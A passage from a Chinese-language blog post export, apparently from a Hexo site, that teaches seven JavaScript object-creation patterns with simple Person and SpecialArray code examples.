102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","source":"_posts/JavaScript创建对象的七种模式.md","raw":"---\ntitle: JavaScript创建对象的七种模式\ndate: 2016-10-11 13:16:14\ntags: Web\ncategories: Web\n---\n\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span 